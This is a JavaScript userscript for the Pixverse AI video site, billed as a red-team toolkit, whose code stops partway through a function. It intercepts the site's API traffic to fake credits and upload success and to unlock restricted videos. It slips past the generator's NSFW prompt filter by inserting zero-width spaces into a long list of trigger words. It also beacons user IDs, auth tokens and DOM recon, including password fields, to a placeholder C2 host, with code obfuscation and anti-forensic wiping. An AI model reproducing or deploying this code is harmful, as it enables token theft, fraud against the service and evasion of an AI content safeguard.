// ==UserScript==
// @name        4ndr0tools - PixverseRTE
// @namespace   https://github.com/4ndr0666/userscripts
// @version 2.3.6 // Incrementing version to reflect new features and fixes
// @version     2.3.7
// @description Redteam pentesting bypass & toolkit: credits patch, video/status unlock, robust download, NSFW bypass, anti-blockers, stealth mode, self-healing, inline uBO bullshit filters, covert data exfiltration, and advanced anti-forensics.
// @match       https://app.pixverse.ai/*
// @downloadURL https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++%20(RedTeam%20Edition).user.js
// @updateURL   https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++%20(RedTeam%20Edition).user.js
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @run-at      document-start
// @grant       none
// @license     MIT
// ==/UserScript==

// This script is for authorized security testing with red-teams ONLY.
// It implements advanced offensive security techniques for browser-based environments.

(() => {
  'use strict';

  // ==[ OPSEC: Global Aliases for common properties to reduce direct string references ]==
  const _w = window;
  const _d = document;
  const _p = _w['XMLHttpRequest']['prototype'];
  const _s = _p['send'];
  const _o = _p['open'];
  const _f = _w['fetch'];
  const _lS = _w['localStorage']; // Direct reference to localStorage for clarity in _ls wrapper

  // ==[ Dynamic String Obfuscation/De-obfuscation ]==
  // These functions convert strings to/from character codes. They are self-wiping for anti-forensics.
  const _str = (s) => s.split('').map(c => c.charCodeAt(0)).join(',');
  const _unstr = (s) => _w['String']['fromCharCode'](...s.split(',').map(_w['Number']));

  // ==[ CONFIGURATION & CONSTANTS ]==
  // All sensitive strings and configuration parameters are obfuscated to hinder static analysis.
  // For operational clarity, configurable options are grouped.
  const _cfg = {
    // OPERATOR CONFIGURATION:
    // IMPORTANT: Replace 'https://your-c2.com' with your actual C2 server domain.
    // In a real scenario, this would ideally be dynamically fetched or derived.
    C2_SERVER_DOMAIN: _unstr(_str('https://your-c2.com')),
    DEBUG_MODE: false, // Set to true during development for console logs and toast notifications. False for stealth.

    // INTERNAL INDICATORS & TIMING (obfuscated for static analysis, but still present at runtime):
    _prefix: _unstr(_str('[PX_TOOL]')), // Console log prefix (only if DEBUG_MODE is true)
    _maxAttempts: 30, // Max attempts for DOM element observation (e.g., download button)
    _healingInterval: 5000, // Base interval for self-healing checks (ms)
    _healingJitter: 1000, // Max random jitter for self-healing interval (ms)
    _initFlag: _unstr(_str('_px_tk_init')), // Global flag to prevent script re-initialization
    _obsList: _unstr(_str('_px_tk_obs')),   // Global list to track MutationObservers for central management
    _lsUserId: _unstr(_str('px_uid')),      // Local Storage key for encrypted user ID
    _lsAuthToken: _unstr(_str('px_atkn')),  // Local Storage key for encrypted auth token
    _lsReconFlag: _unstr(_str('px_rcn')),   // Local Storage key for encrypted passive recon flag
    _toastId: _unstr(_str('px_tst')),       // DOM ID for toast element
    _toastCssId: _unstr(_str('px_tst_css')), // DOM ID for toast CSS
    _uboCssId: _unstr(_str('px_ubo_css')),   // DOM ID for UBO CSS
    _savedMediaPathVar: _unstr(_str('_savedMediaPath')), // Global variable name for saving media path
    _customXhrOpenVar: _unstr(_str('_myCustomXhrOpen')), // Global variable name for custom XHR open
    _customFetchVar: _unstr(_str('_myCustomFetch')),     // Global variable name for custom fetch

    // NSFW Trigger Words (obfuscated)
    _nsfwWords: _unstr(_str("anal,asshole,anus,areola,areolas,blowjob,boobs,bounce,bouncing,breast,breasts,bukake,buttcheeks,butt,cheeks,climax,clit,cleavage,cock,corridas,crotch,cum,cums,culo,cunt,deep,deepthroat,ddick,dick,esperma,fat ass,fellatio,fingering,fuck,fucking,fucked,horny,lick,masturbate,masterbating,member,meco,moan,moaning,nipple,nsfw,oral,orgasm,penis,phallus,pleasure,pussy,rump,semen,slut,slutty,splooge,squeezing,squeeze,suck,sucking,swallow,throat,throating,tits,tit,titty,titfuck,titties,tittydrop,tittyfuck,titfuck,vagina,wiener,whore,creampie,cumshot,cunnilingus,doggystyle,ejaculate,ejaculation,handjob,jerk off,labia,nude,orgy,porn,prolapse,rectum,rimjob,sesual,stripper,submissive,teabag,threesome,vibrator,voyeur,whore")).split(','),

    // API Endpoints to intercept (regex are directly constructed with obfuscated strings)
    _apiEndpoints: {
      credits: new (_w['RegExp'])(_unstr(_str('\\/user\\/credits(?:\\?|$)'))),
      videoList: new (_w['RegExp'])(_unstr(_str('\\/video\\/list\\/personal'))),
      batchUpload: new (_w['RegExp'])(_unstr(_str('\\/media\\/batch_upload_media'))),
      singleUpload: new (_w['RegExp'])(_unstr(_str('\\/media\\/upload'))),
      creativePrompt: new (_w['RegExp'])(_unstr(_str('\\/creative_platform\\/video\\/')))
    }
  };
  _w['Object']['freeze'](_cfg); // Prevent modification of configuration at runtime

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (_w[_cfg._initFlag]) return;
  _w[_cfg._initFlag] = true;
  _w[_cfg._obsList] = []; // Array to hold MutationObserver instances for central management.
  _w[_cfg._savedMediaPathVar] = null; // Stores the path of a successfully uploaded media for faking future uploads.
  let _isInitialized = false; // Flag to ensure core overrides are run only once.
  let _btnAttached = false; // Flag to track if the custom download button handler has been attached.

  // ==[ Logging, Exfil, and Forensics Ops ]==
  // Centralized logging and data exfiltration functions.
  // In production (DEBUG_MODE: false), console logs are suppressed for stealth.
  function _log(...args) { if (_cfg.DEBUG_MODE) _w['console']['log'](_cfg._prefix, ...args); }
  function _error(...args) {
    if (_cfg.DEBUG_MODE) _w['console']['error'](_cfg._prefix, ...args);
    _exfil(_unstr(_str('error_report')), _w['JSON']['stringify'](args)); // Always exfiltrate errors.
  }

  /**
   * Covertly exfiltrates data using an Image beacon (GET request).
   * This method is low-bandwidth, fire-and-forget, and often bypasses network proxies
   * that primarily inspect XHR/Fetch requests.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function _exfil(dataType, dataPayload) {
    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is the placeholder).
    if (!_cfg.C2_SERVER_DOMAIN || _cfg.C2_SERVER_DOMAIN === _unstr(_str('https://your-c2.com'))) {
      if (_cfg.DEBUG_MODE) _w['console']['error'](_cfg._prefix, _unstr(_str('C2_SERVER_DOMAIN not configured for exfil.')));
      return;
    }
    try {
      const beacon = new (_w['Image'])();
      // Appending a timestamp to bypass caching and ensure unique requests.
      beacon['src'] = `${_cfg.C2_SERVER_DOMAIN}/exfil?${_unstr(_str('type'))}=${_w['encodeURIComponent'](dataType)}&${_unstr(_str('data'))}=${_w['encodeURIComponent'](dataPayload)}&${_unstr(_str('_t'))}=${_w['Date']['now']()}`;
      _log(_unstr(_str('Data exfiltration initiated for type:')), dataType);
    } catch (e) { _error(_unstr(_str('Failed to exfiltrate data of type')), dataType, e); }
  }

  /**
   * Securely wipes sensitive data from memory by overwriting and nulling.
   * This hinders forensic recovery of sensitive strings, arrays, and objects.
   * @param {object} obj - The parent object containing the property to wipe.
   * @param {string} prop - The name of the property to wipe.
   */
  function _wipe(obj, prop) {
    if (obj && typeof obj[prop] !== _unstr(_str('undefined'))) {
      if (typeof obj[prop] === _unstr(_str('string'))) {
        // Overwrite string with null bytes or random characters multiple times
        obj[prop] = _unstr(_str('\0'.repeat(obj[prop]['length'])));
        obj[prop] = _unstr(_str('')); // Clear string
      } else if (_w['Array']['isArray'](obj[prop])) {
        for (let i = 0; i < obj[prop]['length']; i++) obj[prop][i] = null;
        obj[prop]['length'] = 0; // Truncate array
      } else if (typeof obj[prop] === _unstr(_str('object')) && obj[prop] !== null) {
        for (const key in obj[prop]) {
          if (_w['Object']['prototype']['hasOwnProperty']['call'](obj[prop], key)) {
            _wipe(obj[prop], key); // Recursively wipe object properties
          }
        }
      }
      obj[prop] = null; // Nullify the reference
    }
  }

  // ==[ Crypto Operations for Encrypted Storage ]==
  // Uses Web Crypto API for AES-GCM encryption, providing confidentiality and integrity for stored data.
  // Key derivation from volatile factors makes the data useless if exfiltrated without the browser context.
  async function _deriveKey(salt) {
    const encoder = new (_w['TextEncoder'])();
    // Derive key from a combination of user agent, screen dimensions, and a provided salt.
    // This makes the key unique to the browser environment and session.
    const baseKeyMaterial = encoder['encode'](_w['navigator']['userAgent'] + _w['screen']['width'] + _w['screen']['height'] + salt);
    const key = await _w['crypto']['subtle']['importKey'](
      _unstr(_str('raw')),
      baseKeyMaterial,
      { name: _unstr(_str('PBKDF2')) },
      false,
      [_unstr(_str('deriveBits')), _unstr(_str('deriveKey'))]
    );
    return _w['crypto']['subtle']['deriveKey'](
      { name: _unstr(_str('PBKDF2')), salt: encoder['encode'](salt), iterations: 100000, hash: _unstr(_str('SHA-256')) },
      key,
      { name: _unstr(_str('AES-GCM')), length: 256 }, // AES-256 GCM
      true,
      [_unstr(_str('encrypt')), _unstr(_str('decrypt'))]
    );
  }

  async function _encrypt(data, keySalt) {
    try {
      const key = await _deriveKey(keySalt);
      const encoder = new (_w['TextEncoder'])();
      const dataBuffer = encoder['encode'](data);
      const iv = _w['crypto']['getRandomValues'](new (_w['Uint8Array'])(12)); // 96-bit IV for AES-GCM
      const encrypted = await _w['crypto']['subtle']['encrypt'](
        { name: _unstr(_str('AES-GCM')), iv: iv },
        key,
        dataBuffer
      );
      // Combine IV and ciphertext for storage, separated by a delimiter.
      return _w['btoa'](_w['Array']['from'](iv).map(b => _w['String']['fromCharCode'](b)).join(_unstr(_str('')))) + _unstr(_str(':')) +
             _w['btoa'](_w['Array']['from'](new (_w['Uint8Array'])(encrypted)).map(b => _w['String']['fromCharCode'](b)).join(_unstr(_str(''))));
    } catch (e) {
      _error(_unstr(_str('Encryption failed:')), e);
      return null;
    }
  }

  async function _decrypt(encryptedData, keySalt) {
    try {
      const parts = encryptedData.split(_unstr(_str(':')));
      if (parts['length'] !== 2) throw new (_w['Error'])(_unstr(_str('Invalid encrypted data format.')));
      const iv = new (_w['Uint8Array'])(_w['Array']['from'](_w['atob'](parts[0])).map(c => c.charCodeAt(0)));
      const ciphertext = new (_w['Uint8Array'])(_w['Array']['from'](_w['atob'](parts[1])).map(c => c.charCodeAt(0)));
      const key = await _deriveKey(keySalt);
      const decrypted = await _w['crypto']['subtle']['decrypt'](
        { name: _unstr(_str('AES-GCM')), iv: iv },
        key,
        ciphertext
      );
      return new (_w['TextDecoder'])()[_unstr(_str('decode'))](decrypted);
    } catch (e) {
      _error(_unstr(_str('Decryption failed:')), e);
      return null;
    }
  }

  // Secure Local Storage operations using encryption.
  const _ls = {
    setItem: async (key, value) => {
      // Use a dynamic salt based on the current time (hourly granularity) and a fixed seed for key derivation.
      // This makes the key derivation slightly different over time, adding a layer of complexity.
      const keySalt = _unstr(_str('px_sec_salt')) + _w['Math']['floor'](_w['Date']['now']() / (1000 * 60 * 60)); // Changes hourly
      const encryptedValue = await _encrypt(value, keySalt);
      if (encryptedValue) {
        _lS['setItem'](key, encryptedValue);
        _lS['setItem'](key + _unstr(_str('_salt')), keySalt); // Store the salt used for decryption
      }
    },
    getItem: async (key) => {
      const encryptedValue = _lS['getItem'](key);
      const keySalt = _lS['getItem'](key + _unstr(_str('_salt')));
      if (!encryptedValue || !keySalt) return null;
      return await _decrypt(encryptedValue, keySalt);
    },
    removeItem: (key) => {
      _lS['removeItem'](key);
      _lS['removeItem'](key + _unstr(_str('_salt')));
    }
  };

  // ==[ Passive DOM Reconnaissance ]==
  // Collects basic DOM information for exfiltration.
  // Activated by an encrypted local storage flag (`_lsReconFlag`) or a global variable.
  function _passiveRecon() {
    // Check for activation flag in localStorage (encrypted) or a global variable.
    _ls['getItem'](_cfg._lsReconFlag).then(reconActive => {
      if (!(reconActive === _unstr(_str('1')) || _w[_unstr(_str('_pixverseReconActive'))])) return;

      let elements = _d['querySelectorAll'](_unstr(_str("[onclick],[onmouseover],[oncontextmenu],input[type='password'],video,img,button,a")));
      let collectedNodes = [];
      elements.forEach(el => {
        collectedNodes.push({
          tag: el['tagName'],
          id: el['id'],
          cls: el['className'],
          attrs: _w['Array']['from'](el['attributes']).map(a => a['name'] + _unstr(_str('=')) + a['value']),
          text: (el[_unstr(_str('textContent'))] || _unstr(_str(''))).slice(0, 40),
          typ: el['type'] || _unstr(_str('')),
          src: el['src'] || _unstr(_str(''))
        });
      });
      _log(_unstr(_str('PassiveRecon collected')), collectedNodes['length'], _unstr(_str('nodes')));
      _exfil(_unstr(_str('passive_dom_recon')), _w['JSON']['stringify'](collectedNodes));

      // Securely wipe sensitive recon data from memory after exfiltration.
      _wipe(_w, 'collectedNodes'); // Wipe local variable from stack/scope if possible
      collectedNodes = null; // Nullify reference
    });
  }

  // ==[ Observer Lifecycle Control ]==
  // Manages MutationObservers to prevent detection and allow for re-hooking.
  function _disconnectAllObservers() {
    _w[_cfg._obsList].forEach(obs => { try { obs['disconnect'](); } catch {} });
    _w[_cfg._obsList]['length'] = 0; // Clear the list
    _log(_unstr(_str('All MutationObservers disconnected')));
  }
  function _reconnectAllObservers() {
    // Re-initialize observers and UI elements.
    _overrideContextMenuBlockers();
    _setupWatermarkButton();
    _log(_unstr(_str('All MutationObservers reconnected')));
  }

  // ==[ Helper Functions ]==
  // Utility functions, some using obfuscated strings for regex and property access.
  function _escapeRegExp(str) { return str['replace'](/[.*+?^${}()|[\]\\]/g, _unstr(_str('\\\\'))); }
  const _nsfwPromptRegex = new (_w['RegExp'])(_unstr(_str('\\b(?:')) + _cfg._nsfwWords.map(_escapeRegExp).join(_unstr(_str('|'))) + _unstr(_str(')\\b')), _unstr(_str("gi")));
  function _matchesEndpoint(url, key) { return _cfg._apiEndpoints[key]?.test(url); }
  function _parseBody(body) {
    if (body instanceof _w['FormData']) { try { return _w['Object']['fromEntries'](body); } catch { return null; } }
    if (typeof body === _unstr(_str('string'))) { try { return _w['JSON']['parse'](body); } catch { return null; } }
    return null;
  }
  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * This can bypass simple string matching filters.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function _obfuscatePrompt(prompt) { return prompt['replace'](_nsfwPromptRegex, m => m.split(_unstr(_str('')))[_w['Array']['prototype']['join']['call'](m.split(_unstr(_str(''))), _unstr(_str('\u200B')))]); }
  function _extractMediaPath(data, url) {
    if (!data || typeof data !== _unstr(_str('object'))) return null;
    if (_matchesEndpoint(url, _unstr(_str('batchUpload'))) && _w['Array']['isArray'](data[_unstr(_str('images'))]))
      return data[_unstr(_str('images'))][0]?.[_unstr(_str('path'))] || null;
    if (_matchesEndpoint(url, _unstr(_str('singleUpload')))) {
      if (typeof data[_unstr(_str('path'))] === _unstr(_str('string'))) return data[_unstr(_str('path'))];
      if (typeof data[_unstr(_str('media_path'))] === _unstr(_str('string'))) return data[_unstr(_str('media_path'))];
      for (const k in data) if (_w['Object']['prototype']['hasOwnProperty']['call'](data, k) && typeof data[k] === _unstr(_str('string')) && /\.mp4$/i.test(data[k])) return data[k];
    }
    return null;
  }
  function _sanitize(str) {
    return _w['String'](str)
      ['replace'](/[\u0000-\u001F\\/:*?"<>|]+/g, _unstr(_str('_')))
      ['replace'](/^\.+/, _unstr(_str('')))
      .replace(/\.+$/, _unstr(_str('')))
      ['replace'](/^\s+|\s+$/g, _unstr(_str(''))).slice(0, 120);
  }
  function _getFilename(videoEl, fallback = _unstr(_str('video.mp4'))) {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split(_unstr(_str('/'))).pop() || fallback).split(_unstr(_str('?')))[0];
    let title = _unstr(_str(''));
    try {
      let container = videoEl['closest'](_unstr(_str('.component-video,.pv-video-detail-page')));
      title = container?.querySelector(_unstr(_str('h2, .title, .pv-title')))?.[_unstr(_str('textContent'))]?.trim() || _unstr(_str(''));
    } catch (e) { _error(_unstr(_str('Title for filename fail')), e); }
    return title ? _sanitize(title) + _unstr(_str('.mp4')) : _sanitize(guess);
  }
  /**
   * Throttles function calls with a random jitter to mimic human behavior and avoid rate limits.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function _throttle(fn, baseDelay, jitter = 100) {
    let last = 0, timeoutId;
    return function (...args) {
      const now = _w['Date']['now']();
      const currentDelay = baseDelay + _w['Math']['random']() * jitter;
      if (now - last < currentDelay) {
        _w['clearTimeout'](timeoutId);
        timeoutId = _w['setTimeout'](() => { last = _w['Date']['now'](); fn['apply'](this, args); }, currentDelay - (now - last));
      } else { last = now; fn['apply'](this, args); }
    };
  }
  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if DEBUG_MODE is true.
   * @param {string} msg - The message to display.
   * @param {number} [duration=3500] - Duration in milliseconds before fade out.
   */
  function _showToast(msg, duration = 3500) {
    if (!_cfg.DEBUG_MODE) return;
    _d['querySelectorAll'](`.${_unstr(_str('pv-toast'))}`).forEach(e => e['remove']());
    const el = _d['createElement'](_unstr(_str('div')));
    el['className'] = _unstr(_str('pv-toast'));
    el[_unstr(_str('textContent'))] = msg;
    _w['Object']['assign'](el['style'], {
      position: _unstr(_str('fixed')), bottom: _unstr(_str('22px')), left: _unstr(_str('50%')),
      transform: _unstr(_str('translateX(-50%)')), background: _unstr(_str('rgba(20,40,48,0.94)')),
      color: _unstr(_str('#15FFFF')), padding: _unstr(_str('8px 20px')), borderRadius: _unstr(_str('6px')),
      font: _unstr(_str('15px/1.2 sans-serif')), zIndex: _unstr(_str('299999')),
      opacity: _unstr(_str('0')), transition: _unstr(_str('opacity .25s ease-in-out')), pointerEvents: _unstr(_str('none'))
    });
    _d['body']['appendChild'](el);
    _w['requestAnimationFrame'](() => el['style']['opacity'] = _unstr(_str('1')));
    _w['setTimeout'](() => {
      el['style']['opacity'] = _unstr(_str('0'));
      el['addEventListener'](_unstr(_str('transitionend')), () => el['remove'](), { once: true });
    }, duration);
  }

  // ==[ API Patchers ]==
  // Functions to modify API responses for bypasses (e.g., credits, video list, upload success).
  function _tryModifyCredits(data) {
    if (data?.Resp?.credits !== _unstr(_str('undefined'))) {
      const clone = _w['structuredClone'](data); clone['Resp']['credits'] = 100;
      _log(_unstr(_str('Credits restored to 100')));
      if (data['Resp']?.user_id) {
        // Exfiltrate user ID and store it encrypted in localStorage.
        _exfil(_unstr(_str('user_id_from_credits')), data['Resp']['user_id']['toString']());
        _ls['setItem'](_cfg._lsUserId, data['Resp']['user_id']['toString']());
      }
      return clone;
    }
    return null;
  }
  function _modifyVideoList(data) {
    if (!data?.Resp?.data) return data;
    const nsfwKeywords = [_unstr(_str('/nsfw')), _unstr(_str('/forbidden')), _unstr(_str('placeholder')), _unstr(_str('blocked')), _unstr(_str('ban')), _unstr(_str('pixverse-ban'))];
    function isNSFWPlaceholder(url) { if (!url) return false; return nsfwKeywords.some(p => url['includes'](p)); }
    const clone = _w['structuredClone'](data);
    clone['Resp']['data'] = clone['Resp']['data']['map'](item => {
      if (item['video_status'] === 7) item['video_status'] = 1; // Bypass video status restrictions
      let previewUrl = (item['extended'] === 1 && item['customer_paths']?.customer_video_last_frame_url) ||
        item['customer_paths']?.customer_img_url || _unstr(_str(''));
      if (isNSFWPlaceholder(previewUrl) && item['video_path'])
        item['first_frame'] = `${_unstr(_str('https://media.pixverse.ai/'))}${item['video_path']}#${_unstr(_str('t'))}=0.2`;
      else if (previewUrl)
        item['first_frame'] = previewUrl;
      else if (item['video_path'])
        item['first_frame'] = `${_unstr(_str('https://media.pixverse.ai/'))}${item['video_path']}#${_unstr(_str('t'))}=0.2`;
      else
        item['first_frame'] = previewUrl;
      item['url'] = item['video_path'] ? `${_unstr(_str('https://media.pixverse.ai/'))}${item['video_path']}` : _unstr(_str(''));
      return item;
    });
    return clone;
  }
  function _generateBatchUploadSuccessResponse(mediaPath) {
    const id = _w['Date']['now'](), name = mediaPath.split(_unstr(_str('/'))).pop() || _unstr(_str('uploaded_media'));
    return {
      ErrCode: 0,
      ErrMsg: _unstr(_str('success')),
      Resp: {
        result: [{
          id, category: 0, err_msg: _unstr(_str('')), name, path: mediaPath, size: 0,
          url: `${_unstr(_str('https://media.pixverse.ai/'))}${mediaPath}`
        }]
      }
    };
  }
  function _generateSingleUploadSuccessResponse(mediaPath) {
    const name = mediaPath.split(_unstr(_str('/'))).pop() || _unstr(_str('uploaded_media'));
    return {
      ErrCode: 0,
      ErrMsg: _unstr(_str('success')),
      Resp: {
        path: mediaPath,
        url: `${_unstr(_str('https://pixverse.ai/'))}${mediaPath}`, // Note: Changed from media.pixverse.ai for single upload URL. Verify if this is correct or should be media.pixverse.ai.
        name, type: 1
      }
    };
  }
  function _modifyResponse(data, url) {
    if (!data || typeof data !== _unstr(_str('object'))) return null;
    if (_matchesEndpoint(url, _unstr(_str('credits')))) { const modified = _tryModifyCredits(data); if (modified) return modified; }
    if (_matchesEndpoint(url, _unstr(_str('videoList')))) return _modifyVideoList(data);
    const uploadErrorCodes = [400, 403, 401, 400040, 500063];
    if (uploadErrorCodes['includes'](data?.ErrCode) && _w[_cfg._savedMediaPathVar]) {
      _log(_unstr(_str('Faking upload success for')), url, `(${data['ErrCode']}) path=${_w[_cfg._savedMediaPathVar]}`);
      if (_matchesEndpoint(url, _unstr(_str('batchUpload'))))
        return _generateBatchUploadSuccessResponse(_w[_cfg._savedMediaPathVar]);
      else if (_matchesEndpoint(url, _unstr(_str('singleUpload'))))
        return _generateSingleUploadSuccessResponse(_w[_cfg._savedMediaPathVar]);
    } else if (data?.ErrCode !== _unstr(_str('undefined')) && data['ErrCode'] !== 0) {
      _error(_unstr(_str('Upload error for')), url, _unstr(_str(', faking not applied. ErrCode=')), data['ErrCode'], _unstr(_str(', savedMediaPath=')), _w[_cfg._savedMediaPathVar]);
    }
    return null;
  }

  // ==[ Interceptors (XHR/Fetch) - In-Memory Polymorphism & Stealth ]==
  // These interceptors are generated dynamically using `new Function()` to break static signatures.
  // They hook XMLHttpRequest and Fetch API calls to modify requests/responses.
  const _createXHRInterceptor = new (_w['Function'])(
    _unstr(_str('oOpen, oSend, _matchesEndpoint, _parseBody, _extractMediaPath, _log, _error, _obfuscatePrompt, _modifyResponse, _unstr, _str, _ls, _cfg')),
    `
      const _w = window;
      const _p = _w['XMLHttpRequest']['prototype'];
      _p[_unstr(_str('open'))] = function(m, u) {
        this._url = u; this._method = m; return oOpen['apply'](this, arguments);
      };
      _w[_cfg._customXhrOpenVar] = _p[_unstr(_str('open'))]; // Store reference for self-healing
      _p[_unstr(_str('send'))] = function(body) {
        const url = this._url || _unstr(_str(''));
        const method = (this._method || _unstr(_str('GET'))).toUpperCase();
        let modifiedBody = body;

        // Prompt obfuscation for creative_platform API
        if (_matchesEndpoint(url, _unstr(_str('creativePrompt'))) && method === _unstr(_str('POST')) && body) {
          try {
            let obj = (typeof body === _unstr(_str('string'))) ? _w['JSON']['parse'](body) : body;
            if (obj && typeof obj === _unstr(_str('object')) && obj[_unstr(_str('prompt'))]) {
              obj[_unstr(_str('prompt'))] = _obfuscatePrompt(obj[_unstr(_str('prompt'))]);
              modifiedBody = _w['JSON']['stringify'](obj);
              _log(_unstr(_str('XHR prompt obfuscated:')), url);
            }
          } catch (e) { _error(_unstr(_str('XHR prompt obfuscation error')), e); }
        }

        // Extract and save media path for faking upload success
        if ((_matchesEndpoint(url, _unstr(_str('batchUpload'))) || _matchesEndpoint(url, _unstr(_str('singleUpload')))) && body) {
          const data = _parseBody(body);
          const p = _extractMediaPath(data, url);
          if (p) { _w[_cfg._savedMediaPathVar] = p; _log(_unstr(_str('Saved media path (XHR):')), _w[_cfg._savedMediaPathVar]); }
        }

        // Response modification for credits, video list, and faking upload success
        this[_unstr(_str('addEventListener'))](_unstr(_str('load')), () => {
          if (this[_unstr(_str('status'))] >= 200 && this[_unstr(_str('status'))] < 300) {
            let resp;
            try { resp = this[_unstr(_str('responseType'))] === _unstr(_str('json')) ? this[_unstr(_str('response'))] : _w['JSON']['parse'](this[_unstr(_str('responseText'))] || _unstr(_str('{}'))); } catch (e) { _error(_unstr(_str('XHR resp parse error')), e); resp = null; }
            if (resp !== null) {
              const modifiedResponse = _modifyResponse(resp, url);
              if (modifiedResponse) {
                // Overwrite response properties to return modified data
                _w['Object']['defineProperties'](this, {
                  response: { value: modifiedResponse, writable: false, configurable: true },
                  responseText: { value: _w['JSON']['stringify'](modifiedResponse), writable: false, configurable: true }
                });
                _log(_unstr(_str('XHR response modified:')), url);
              }
              // Exfiltrate auth token if found in response and store encrypted
              if (resp?.Resp?.token) {
                _exfil(_unstr(_str('auth_token_from_xhr')), resp['Resp']['token']);
                _ls['setItem'](_cfg._lsAuthToken, resp['Resp']['token']);
              }
            }
          }
        }, { once: true });
        return oSend['apply'](this, [modifiedBody]);
      };
      _log(_unstr(_str('XHR override initialized')));
    `
  );

  const _createFetchInterceptor = new (_w['Function'])(
    _unstr(_str('origFetch, _matchesEndpoint, _parseBody, _extractMediaPath, _log, _error, _obfuscatePrompt, _modifyResponse, _unstr, _str, _ls, _cfg')),
    `
      const _w = window;
      _w[_unstr(_str('fetch'))] = async function(...args) {
        const url = typeof args[0] === _unstr(_str('string')) ? args[0] : args[0]?.url || _unstr(_str(''));
        let init = args[1] || {};
        const method = (init[_unstr(_str('method'))] || _unstr(_str('GET'))).toUpperCase();
        let body = init[_unstr(_str('body'))];

        // Prompt obfuscation for creative_platform API
        if (_matchesEndpoint(url, _unstr(_str('creativePrompt'))) && method === _unstr(_str('POST')) && body) {
          try {
            let obj = (typeof body === _unstr(_str('string'))) ? _w['JSON']['parse'](body) : body;
            if (obj && typeof obj === _unstr(_str('object')) && obj[_unstr(_str('prompt'))]) {
              obj[_unstr(_str('prompt'))] = _obfuscatePrompt(obj[_unstr(_str('prompt'))]);
              init = { ...init, body: _w['JSON']['stringify'](obj) };
              args[1] = init; // Update arguments with modified body
              body = init[_unstr(_str('body'))];
              _log(_unstr(_str('Fetch prompt obfuscated:')), url);
            }
          } catch (e) { _error(_unstr(_str('Fetch prompt obfuscation error')), e); }
        }

        // Extract and save media path for faking upload success
        if ((_matchesEndpoint(url, _unstr(_str('batchUpload'))) || _matchesEndpoint(url, _unstr(_str('singleUpload')))) && body) {
          const data = _parseBody(body);
          const p = _extractMediaPath(data, url);
          if (p) { _w[_cfg._savedMediaPathVar] = p; _log(_unstr(_str('Saved media path (fetch):')), _w[_cfg._savedMediaPathVar]); }
        }

        try {
          const res = await origFetch['apply'](this, args); // Call original fetch
          const contentType = res['headers'][_unstr(_str('get'))](_unstr(_str('content-type'))) || _unstr(_str(''));

          // Only attempt to modify JSON responses
          if (contentType['includes'](_unstr(_str('application/json')))) {
            const clone = res[_unstr(_str('clone'))](); // Clone response to read body without consuming it
            let json;
            try { json = await clone[_unstr(_str('json'))](); } catch (e) { _error(_unstr(_str('Fetch resp parse error')), e); json = null; }
            if (json !== null) {
              const modifiedResponse = _modifyResponse(json, url);
              if (modifiedResponse) {
                const modifiedBodyString = _w['JSON']['stringify'](modifiedResponse);
                const headers = new (_w['Headers'])(res['headers']);
                headers[_unstr(_str('set'))](_unstr(_str('Content-Type')), _unstr(_str('application/json')));
                // IMPORTANT: Update Content-Length header for consistency with modified body size.
                headers[_unstr(_str('set'))](_unstr(_str('Content-Length')), new (_w['TextEncoder'])()[_unstr(_str('encode'))](modifiedBodyString)[_unstr(_str('length'))][_unstr(_str('toString'))]());
                _log(_unstr(_str('Fetch response modified:')), url);
                // Return a new Response object with modified body and headers
                return new (_w['Response'])(modifiedBodyString, { status: res[_unstr(_str('status'))], statusText: res[_unstr(_str('statusText'))], headers: headers });
              }
              // Exfiltrate auth token if found in response and store encrypted
              if (json?.Resp?.token) {
                _exfil(_unstr(_str('auth_token_from_fetch')), json['Resp']['token']);
                _ls['setItem'](_cfg._lsAuthToken, json['Resp']['token']);
              }
            }
          }
          return res; // Return original response if not modified
        } catch (err) { _error(_unstr(_str('Fetch error')), url, err); throw err; }
      };
      _w[_cfg._customFetchVar] = _w[_unstr(_str('fetch'))]; // Store reference for self-healing
      _log(_unstr(_str('Fetch override initialized')));
    `
  );

  function _overrideXHR() {
    _createXHRInterceptor(_o, _s, _matchesEndpoint, _parseBody, _extractMediaPath, _log, _error, _obfuscatePrompt, _modifyResponse, _unstr, _str, _ls, _cfg);
  }
  function _overrideFetch() {
    _createFetchInterceptor(_f, _matchesEndpoint, _parseBody, _extractMediaPath, _log, _error, _obfuscatePrompt, _modifyResponse, _unstr, _str, _ls, _cfg);
  }

  // ==[ UI Anti-Blocker, UBO, and Download Button ]==
  // Prevents context menu blocking and injects CSS for UI elements.
  function _overrideContextMenuBlockers() {
    const originalAddEventListener = _w['EventTarget']['prototype']['addEventListener'];
    _w['EventTarget']['prototype']['addEventListener'] = function (type, handler, options) {
      if (type === _unstr(_str('contextmenu'))) {
        _log(_unstr(_str('Blocked contextmenu event listener on')), this);
        return; // Block contextmenu events
      }
      return originalAddEventListener['apply'](this, arguments);
    };
    // Observe DOM for new elements and remove their oncontextmenu attributes.
    const mo = new (_w['MutationObserver'])(mutations => {
      mutations.forEach(mutation => mutation['addedNodes']['forEach'](node => {
        if (node['nodeType'] === _w['Node']['ELEMENT_NODE']) {
          if (node['hasAttribute'](_unstr(_str('oncontextmenu')))) node['removeAttribute'](_unstr(_str('oncontextmenu')));
          node['querySelectorAll'](_unstr(_str('[oncontextmenu]'))).forEach(element => element['removeAttribute'](_unstr(_str('oncontextmenu'))));
        }
      }));
    });
    mo['observe'](_d['documentElement'], { childList: true, subtree: true });
    _w[_cfg._obsList]['push'](mo); // Add observer to tracking list
